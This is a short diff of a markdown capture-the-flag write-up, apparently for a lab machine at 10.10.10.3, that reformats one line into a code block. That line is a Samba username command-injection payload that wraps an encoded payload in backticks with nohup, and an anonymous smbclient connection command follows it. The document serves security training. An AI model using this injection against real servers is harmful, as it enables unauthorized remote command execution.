@@ -202,7 +202,9 @@ Copied to: /home/kali/16320.rb
 ```
 ![image](https://github.com/h4md153v63n/CTFs/assets/5091265/a6ab3615-2dfe-41ca-b51f-e85a659c61e3)
 `<br>
-`username = "/=`nohup " + payload.encoded + "`"`
+```
+username = "/=`nohup " + payload.encoded + "`"
+```
 
 + `smbclient //10.10.10.3/tmp -N`
 
